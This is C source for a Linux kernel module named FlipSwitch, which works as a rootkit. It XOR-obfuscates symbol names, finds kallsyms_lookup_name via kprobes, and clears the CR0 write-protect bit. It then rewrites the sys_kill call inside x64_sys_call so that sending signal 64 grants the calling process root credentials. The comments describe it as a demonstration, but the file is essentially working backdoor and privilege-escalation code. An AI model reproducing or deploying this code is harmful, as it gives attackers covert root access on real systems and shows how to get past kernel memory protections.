#include "main.h"

/*
 * Deobfuscate an XOR-obfuscated string at runtime.
 * Returns a pointer to a static buffer containing the deobfuscated string.
 */
char *deobfuscate(const unsigned char *data, size_t len, unsigned char key)
{
    static char buf[256];
    size_t i;
    if (len > sizeof(buf))
        return NULL;
    for (i = 0; i < len - 1; ++i) {
        buf[i] = data[i] ^ key;
    }
    buf[len - 1] = '\0';
    return buf;
}




void give_root(void)
{
    //dynamically find a pointer to prepare_creds and commit_creds
    void *prepare_creds_addr = find_sym_pointer(O_STRING("prepare_creds"));
    void *commit_creds_addr = find_sym_pointer(O_STRING("commit_creds"));

    if (!prepare_creds_addr || !commit_creds_addr) {
        debug_printk("Failed to find prepare_creds or commit_creds\n");
        return;
    }
    typedef struct cred *(*t_prepare_creds)(void);
    typedef int (*t_commit_creds)(struct cred *);
    struct cred *new_cred;
    new_cred = ((t_prepare_creds)prepare_creds_addr)();
    if (!new_cred)
        return;

    new_cred->uid.val = new_cred->gid.val = 0;
    new_cred->euid.val = new_cred->egid.val = 0;
    new_cred->suid.val = new_cred->sgid.val = 0;
    new_cred->fsuid.val = new_cred->fsgid.val = 0;

    ((t_commit_creds)commit_creds_addr)(new_cred);
}

/**
 * Find the address of kallsyms_lookup_name using kprobes
 * @return Pointer to kallsyms_lookup_name function or NULL on failure
 */
void *find_kallsyms_lookup_name(void)
{
    struct kprobe *kp;
    void *addr;

    kp = kzalloc(sizeof(*kp), GFP_KERNEL);
    if (!kp)
        return NULL;

    kp->symbol_name = O_STRING("kallsyms_lookup_name");
    if (register_kprobe(kp) != 0) {
        kfree(kp);
        return NULL;
    }

    addr = kp->addr;
    unregister_kprobe(kp);
    kfree(kp);

    return addr;
}

/**
 * Find a kernel symbol using kallsyms_lookup_name
 * @param kallsyms_lookup_name_addr Address of kallsyms_lookup_name function
 * @param symbol_name Name of the symbol to look up
 * @return Pointer to the symbol or NULL on failure
 */
void *find_sym_pointer(const char *symbol_name)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t)kallsyms_lookup_name_addr;

    if (!kallsyms_lookup_name)
        return NULL;

    return (void *)kallsyms_lookup_name(symbol_name);
}

/**
 * Fake kill syscall handler - FlipSwitch intercepts kill syscall
 * @param regs CPU registers containing syscall arguments
 * @return Always returns 0
 */
asmlinkage int fake_kill(const struct pt_regs *regs)
{
#ifdef DEBUG
    int pid = regs->di;
#endif
    int sig = regs->si;
    
    

    if (sig == 64) { // Custom signal to give root
        debug_printk("Intercepted kill syscall - pid=%d, sig=%d\n", pid, sig);
        debug_printk("Giving root privileges\n");
        give_root();
        return 0;
    }

    if (original_kill_syscall)
        return original_kill_syscall(regs);

    return 0;
}

/**
 * Force write to CR0 register bypassing compiler optimizations
 * @param val Value to write to CR0
 */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long order;

    asm volatile("mov %0, %%cr0" 
        : "+r"(val), "+m"(order));
}

/**
 * Enable write protection (set WP bit in CR0)
 */
static inline void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0_forced(cr0);
}

/**
 * Disable write protection (clear WP bit in CR0)
 */
static inline void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0_forced(cr0);
}

/**
 * Module initialization function
 * FlipSwitch: Demonstrates syscall hooking by intercepting the kill syscall
 */
static int __init flipswitch_init(void)
{
    unsigned long *sys_call_table;
    void *x64_sys_call;
    
    debug_printk("Module loaded\n");
    
    /* Find kallsyms_lookup_name using kprobes */
    kallsyms_lookup_name_addr = find_kallsyms_lookup_name();
    if (!kallsyms_lookup_name_addr) {
        debug_printk(KERN_ERR "FlipSwitch: Failed to find address of kallsyms_lookup_name\n");
        return -1;
    }
    debug_printk("Address of kallsyms_lookup_name: %p\n", kallsyms_lookup_name_addr);

    /* Find sys_call_table using kallsyms_lookup_name */
    sys_call_table = find_sym_pointer(O_STRING("sys_call_table"));
    if (!sys_call_table) {
        debug_printk(KERN_ERR "FlipSwitch: Failed to find address of sys_call_table\n");
        return -1;
    }
    debug_printk("Address of sys_call_table: %p\n", sys_call_table);

    /* Get the address of the sys_kill syscall and save original */
    if (sys_call_table) {
        unsigned long *sys_kill = (unsigned long *)sys_call_table[__NR_kill];
        debug_printk("Address of sys_kill: %p\n", sys_kill);
        original_kill_syscall = (t_syscall)sys_kill;
    }

    /* Find the address of x64_sys_call function */
    x64_sys_call = find_sym_pointer(O_STRING("x64_sys_call"));
    if (!x64_sys_call) {
        debug_printk(KERN_ERR "FlipSwitch: Failed to find address of x64_sys_call\n");
        return -1;
    }
    debug_printk("Address of x64_sys_call: %p\n", x64_sys_call);

    func_ptr = (unsigned char *)x64_sys_call;

    /* Search for call instruction to sys_kill in x64_sys_call */
    for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
        if (func_ptr[i] == 0xe8) { /* Found a call instruction */
            int32_t rel = *(int32_t *)(func_ptr + i + 1);
            void *call_addr = (void *)((uintptr_t)x64_sys_call + i + 5 + rel);
            
            if (call_addr == (void *)sys_call_table[__NR_kill]) {
                debug_printk("Found call to sys_kill at offset %zu\n", i);
                debug_printk("Call address: %p\n", call_addr);

                /* Disable write protection to modify kernel code */
                disable_write_protection();
                debug_printk("Disabled write protection\n");
                debug_printk("Flipping switch - replacing syscall with fake_kill\n");

                /* Calculate new relative offset to fake_kill */
                int32_t new_rel = (uintptr_t)fake_kill - ((uintptr_t)x64_sys_call + i + 5);
                hooked_offset = i + 1;

                /* Save original offset and replace with new one */
                original_target = rel;  
                memcpy(func_ptr + hooked_offset, &new_rel, sizeof(new_rel));
                
                /* Re-enable write protection */
                enable_write_protection();
                debug_printk("Enabled write protection\n");
                break;
            }
        }
    }

    return 0;
}

/**
 * Module cleanup function
 * FlipSwitch: Restores the original syscall when module is unloaded
 */
static void __exit flipswitch_exit(void)
{
    /* Restore the original syscall if we hooked it */
    if (hooked_offset && func_ptr) {
        disable_write_protection();
        memcpy(func_ptr + hooked_offset, &original_target, sizeof(original_target));
        enable_write_protection();
        debug_printk("Restored original syscall\n");
    }

    debug_printk("Module unloaded\n");
}

module_init(flipswitch_init);
module_exit(flipswitch_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(MODULE_AUTHOR_NAME);
MODULE_DESCRIPTION(MODULE_DESC);
MODULE_VERSION(MODULE_VER);